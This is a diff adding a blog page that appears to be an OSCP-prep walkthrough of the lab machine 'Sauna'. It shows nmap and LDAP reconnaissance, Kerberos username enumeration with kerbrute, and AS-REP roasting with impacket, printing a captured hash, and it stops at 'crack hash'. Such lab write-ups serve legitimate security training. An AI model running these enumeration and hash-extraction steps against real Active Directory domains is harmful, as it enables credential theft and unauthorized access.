@@ -1,0 +1,696 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="So1Lupus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SaunaReconnmap1234567891011121314151617181920212223242526272829303132333435363738# Nmap 7.93 scan initiated Fri May  5 15:30:30 2023 as: nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Road-to-OSCP-6-Sauna">
+<meta property="og:url" content="http://example.com/2023/05/07/Road-to-OSCP-6-Sauna/index.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="SaunaReconnmap1234567891011121314151617181920212223242526272829303132333435363738# Nmap 7.93 scan initiated Fri May  5 15:30:30 2023 as: nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/05/07/Road-to-OSCP-6-Sauna/image-20230507213825194.png">
+<meta property="og:image" content="http://example.com/2023/05/07/Road-to-OSCP-6-Sauna/user.png">
+<meta property="og:image" content="http://example.com/2023/05/07/Road-to-OSCP-6-Sauna/svc_loadnmanager.png">
+<meta property="og:image" content="http://example.com/2023/05/07/Road-to-OSCP-6-Sauna/image-20230507220204297.png">
+<meta property="og:image" content="http://example.com/2023/05/07/Road-to-OSCP-6-Sauna/image-20230507220209450.png">
+<meta property="article:published_time" content="2023-05-07T14:08:55.000Z">
+<meta property="article:modified_time" content="2023-05-07T14:13:30.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="OSCP备考">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/05/07/Road-to-OSCP-6-Sauna/image-20230507213825194.png">
+  
+  
+  
+  <title>Road-to-OSCP-6-Sauna - So1Lupus</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>So1Lupus</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Road-to-OSCP-6-Sauna"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-07 22:08" pubdate>
+          2023年5月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          58 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Road-to-OSCP-6-Sauna</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Sauna"><a href="#Sauna" class="headerlink" title="Sauna"></a>Sauna</h1><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Nmap 7.93 scan initiated Fri May  5 15:30:30 2023 as: nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oN nmapTcp 10.10.10.175</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span><br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.32s</span> <span class="hljs-string">latency).</span><br><br><span class="hljs-string">PORT</span>     <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>       <span class="hljs-string">VERSION</span><br><span class="hljs-number">53</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">domain</span>        <span class="hljs-string">Simple</span> <span class="hljs-string">DNS</span> <span class="hljs-string">Plus</span><br><span class="hljs-number">80</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">http</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">IIS</span> <span class="hljs-string">httpd</span> <span class="hljs-number">10.0</span><br><span class="hljs-string">|</span> <span class="hljs-attr">http-methods:</span> <br><span class="hljs-string">|_</span>  <span class="hljs-attr">Potentially risky methods:</span> <span class="hljs-string">TRACE</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-IIS/10.0</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-attr">Egotistical Bank ::</span> <span class="hljs-string">Home</span><br><span class="hljs-number">88</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">kerberos-sec</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2023-05-05 14:30:47Z</span><span class="hljs-string">)</span><br><span class="hljs-number">135</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">139</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span><br><span class="hljs-number">389</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">EGOTISTICAL-BANK.LOCAL0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">445</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds?</span><br><span class="hljs-number">464</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">kpasswd5?</span><br><span class="hljs-number">593</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>    <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span><br><span class="hljs-number">3268</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">EGOTISTICAL-BANK.LOCAL0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">3269</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span><br><span class="hljs-number">5985</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">http</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span><br><span class="hljs-number">9389</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">mc-nmf</span>        <span class="hljs-string">.NET</span> <span class="hljs-string">Message</span> <span class="hljs-string">Framing</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">SAUNA;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows</span><br><br><span class="hljs-attr">Host script results:</span><br><span class="hljs-string">|_clock-skew:</span> <span class="hljs-string">7h00m00s</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">311:</span> <br><span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">and</span> <span class="hljs-string">required</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2023-05-05T14:31:08</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-string">N/A</span><br><br><span class="hljs-string">Service</span> <span class="hljs-string">detection</span> <span class="hljs-string">performed.</span> <span class="hljs-string">Please</span> <span class="hljs-string">report</span> <span class="hljs-string">any</span> <span class="hljs-string">incorrect</span> <span class="hljs-string">results</span> <span class="hljs-string">at</span> <span class="hljs-string">https://nmap.org/submit/</span> <span class="hljs-string">.</span><br><span class="hljs-comment"># Nmap done at Fri May  5 15:31:49 2023 -- 1 IP address (1 host up) scanned in 79.48 seconds</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="ldap-389"><a href="#ldap-389" class="headerlink" title="ldap  - 389"></a>ldap  - 389</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">ldapsearch <span class="hljs-params">-H</span> ldap:<span class="hljs-comment">//10.10.10.175 -x -s base namingcontext</span><br>    <br>namingcontexts: DC=EGOTISTICAL<span class="hljs-params">-BANK</span>,DC=<span class="hljs-built_in">LOCAL</span><br>namingcontexts: <span class="hljs-literal">CN</span>=Configuration,DC=EGOTISTICAL<span class="hljs-params">-BANK</span>,DC=<span class="hljs-built_in">LOCAL</span><br>namingcontexts: <span class="hljs-literal">CN</span>=Schema,<span class="hljs-literal">CN</span>=Configuration,DC=EGOTISTICAL<span class="hljs-params">-BANK</span>,DC=<span class="hljs-built_in">LOCAL</span><br>namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL<span class="hljs-params">-BANK</span>,DC=<span class="hljs-built_in">LOCAL</span><br>namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL<span class="hljs-params">-BANK</span>,DC=<span class="hljs-built_in">LOCAL</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ldif">ldapsearch -x -h 10.10.10.175 -b &#x27;DC=EGOTISTICAL-BANK,DC=LOCAL&#x27;<br><br><span class="hljs-attribute">dn</span>: DC=EGOTISTICAL-BANK,DC=LOCAL                      <br><span class="hljs-attribute">objectClass</span>: top<br><span class="hljs-attribute">objectClass</span>: domain<br><span class="hljs-attribute">objectClass</span>: domainDNS<br><span class="hljs-attribute">distinguishedName</span>: DC=EGOTISTICAL-BANK,DC=LOCAL<br><span class="hljs-attribute">instanceType</span>: 5<br><span class="hljs-attribute">whenCreated</span>: 20200123054425.0Z<br><span class="hljs-attribute">whenChanged</span>: 20200216124516.0Z<br><span class="hljs-attribute">subRefs</span>: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL<br><span class="hljs-attribute">subRefs</span>: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL<br><span class="hljs-attribute">subRefs</span>: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL<br>...[snip]...<br></code></pre></td></tr></table></figure>
+
+<h3 id="website-80"><a href="#website-80" class="headerlink" title="website  -80"></a>website  -80</h3><p>find some teammate’s name.</p>
+<img src="/2023/05/07/Road-to-OSCP-6-Sauna/image-20230507213825194.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="kerberos-88"><a href="#kerberos-88" class="headerlink" title="kerberos  -88"></a>kerberos  -88</h3><p>using kerbrute to userenum to get valid user lists. </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">kerbrute userenum -d EGOTISTICAL-BANK.LOCAL <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Usernames/xato-net-<span class="hljs-number">10</span>-million-usernames.txt --dc <span class="hljs-number">10.10</span>.<span class="hljs-number">10.175</span><br>    __             __               __     <br>   <span class="hljs-regexp">/ /</span>_____  _____<span class="hljs-regexp">/ /</span>_  _______  __<span class="hljs-regexp">/ /</span>____ <br>  <span class="hljs-regexp">/ /</span><span class="hljs-regexp">/_/</span> _ \<span class="hljs-regexp">/ ___/</span> __ \<span class="hljs-regexp">/ ___/</span> <span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/ __/</span> _ \<br> <span class="hljs-regexp">/ ,&lt; /</span>  __<span class="hljs-regexp">/ /</span>  <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/  /</span> <span class="hljs-regexp">/_/</span> <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/  __/</span><br><span class="hljs-regexp">/_/</span>|_|\___<span class="hljs-regexp">/_/</span>  <span class="hljs-regexp">/_.___/</span>_<span class="hljs-regexp">/   \__,_/</span>\__<span class="hljs-regexp">/\___/</span>                                        <br><br>Version: dev (n<span class="hljs-regexp">/a) - 02/</span><span class="hljs-number">15</span>/<span class="hljs-number">20</span> - Ronnie Flathers @ropnop<br><br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">41</span>:<span class="hljs-number">50</span> &gt;  Using KDC(s):<br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">41</span>:<span class="hljs-number">50</span> &gt;   <span class="hljs-number">10.10</span>.<span class="hljs-number">10.175</span>:<span class="hljs-number">88</span><br><br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">41</span>:<span class="hljs-number">59</span> &gt;  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL<br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">42</span>:<span class="hljs-number">46</span> &gt;  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL<br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">42</span>:<span class="hljs-number">54</span> &gt;  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL<br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">43</span>:<span class="hljs-number">21</span> &gt;  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL<br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">47</span>:<span class="hljs-number">43</span> &gt;  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL<br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">15</span> <span class="hljs-number">16</span>:<span class="hljs-number">01</span>:<span class="hljs-number">56</span> &gt;  [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL<br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">16</span> <span class="hljs-number">03</span>:<span class="hljs-number">13</span>:<span class="hljs-number">54</span> &gt;  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL<br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">16</span> <span class="hljs-number">03</span>:<span class="hljs-number">13</span>:<span class="hljs-number">54</span> &gt;  [+] VALID USERNAME:       FSMITH@EGOTISTICAL-BANK.LOCAL<br><span class="hljs-number">2020</span><span class="hljs-regexp">/02/</span><span class="hljs-number">16</span> <span class="hljs-number">03</span>:<span class="hljs-number">24</span>:<span class="hljs-number">34</span> &gt;  Done! Tested <span class="hljs-number">8295455</span> usernames (<span class="hljs-number">8</span> valid) <span class="hljs-keyword">in</span> <span class="hljs-number">17038.364</span> seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="Shell-as-fsmith"><a href="#Shell-as-fsmith" class="headerlink" title="Shell as fsmith"></a>Shell as fsmith</h2><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>get-hash</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">impacket-GetNPUsers &#x27;EGOTISTICAL-BANK.LOCAL/&#x27; -userfile users.txt -format hashcat -outputfile  hash -dc-ip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.175</span><br><br>$krb<span class="hljs-number">5</span>asrep$<span class="hljs-number">23</span>$fsmith<span class="hljs-title">@EGOTISTICAL-BANK.LOCAL</span>:<span class="hljs-number">6917e50</span>f<span class="hljs-number">638536</span>dc<span class="hljs-number">4</span>a<span class="hljs-number">8</span>acec<span class="hljs-number">7903</span>dc<span class="hljs-number">045</span>$<span class="hljs-number">2</span>b<span class="hljs-number">03</span>faaa<span class="hljs-number">6</span>ed<span class="hljs-number">126e97</span>cbc<span class="hljs-number">936</span>ab<span class="hljs-number">835e16</span>b<span class="hljs-number">6</span>a<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">185</span>bded<span class="hljs-number">1e4</span>f<span class="hljs-number">679985</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>adcb<span class="hljs-number">993</span>ad<span class="hljs-number">7</span>b<span class="hljs-number">843</span>a<span class="hljs-number">05e6</span>fe<span class="hljs-number">0</span>ccaa<span class="hljs-number">35</span>a<span class="hljs-number">9</span>f<span class="hljs-number">8</span>d<span class="hljs-number">196</span>d<span class="hljs-number">161</span>d<span class="hljs-number">3</span>b<span class="hljs-number">0335</span>a<span class="hljs-number">6</span>eaf<span class="hljs-number">21e1</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>d<span class="hljs-number">943</span>d<span class="hljs-number">4</span>ad<span class="hljs-number">0</span>fba<span class="hljs-number">1</span>dcc<span class="hljs-number">07283</span><span class="hljs-keyword">c</span><span class="hljs-number">3172</span>b<span class="hljs-number">6</span>eb<span class="hljs-number">2</span>ca<span class="hljs-number">0</span>f<span class="hljs-number">2123</span>f<span class="hljs-number">0</span>efb<span class="hljs-number">81</span>a<span class="hljs-number">517</span>b<span class="hljs-number">1</span>a<span class="hljs-number">8</span>ca<span class="hljs-number">2</span>b<span class="hljs-number">6973</span>fd<span class="hljs-number">073</span>dff<span class="hljs-number">3</span>b<span class="hljs-number">67</span>a<span class="hljs-number">02961060</span>f<span class="hljs-number">232</span><span class="hljs-keyword">c</span><span class="hljs-number">99e1985</span>aeb<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>a<span class="hljs-number">803</span>cf<span class="hljs-number">84</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">8122610</span><span class="hljs-keyword">c</span><span class="hljs-number">3297</span>f<span class="hljs-number">1</span>decc<span class="hljs-number">329601</span>aaeec<span class="hljs-number">33</span><span class="hljs-keyword">c</span><span class="hljs-number">92</span>a<span class="hljs-number">25</span><span class="hljs-keyword">c</span><span class="hljs-number">32574</span>d<span class="hljs-number">1537e11</span><span class="hljs-keyword">c</span><span class="hljs-number">09</span>fbdc<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">1169</span>d<span class="hljs-number">381</span>bdf<span class="hljs-number">2864</span>f<span class="hljs-number">3</span>a<span class="hljs-number">6</span>ff<span class="hljs-number">27</span>b<span class="hljs-number">457</span>d<span class="hljs-number">41</span>df<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>b<span class="hljs-number">1</span>b<span class="hljs-number">010</span>d<span class="hljs-number">5</span>a<span class="hljs-number">1</span>b<span class="hljs-number">5</span>a<span class="hljs-number">2</span>bbf<span class="hljs-number">1</span>bd<span class="hljs-number">08</span>f<span class="hljs-number">3</span>a<span class="hljs-number">0259</span>aa<span class="hljs-number">5</span>a<span class="hljs-number">79</span>ca<span class="hljs-number">27</span>a<span class="hljs-number">408</span>bf<span class="hljs-number">40497</span><span class="hljs-keyword">c</span><span class="hljs-number">37</span>ecd<span class="hljs-number">733425</span>d<span class="hljs-number">907</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>ad<span class="hljs-number">4</span>fc<span class="hljs-number">87</span>fbdef<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">417718</span>adfe<span class="hljs-number">0377123821694223</span>dc<span class="hljs-number">850</span>bb<span class="hljs-number">23e67</span>edc<span class="hljs-number">9</span>afd<span class="hljs-number">8254822</span>d<span class="hljs-number">24</span>b<span class="hljs-number">8</span>f<span class="hljs-number">0220</span><span class="hljs-keyword">c</span><span class="hljs-number">20</span>dd<span class="hljs-number">7</span>d<span class="hljs-number">0</span>f<span class="hljs-number">327937439</span>a<span class="hljs-number">1</span>b<span class="hljs-number">9284</span>a<span class="hljs-number">596</span><span class="hljs-keyword">c</span><span class="hljs-number">15</span>d<span class="hljs-number">49</span>fd<span class="hljs-number">9</span>adc<span class="hljs-number">97</span><br></code></pre></td></tr></table></figure>
+
+<p>crack hash</p>
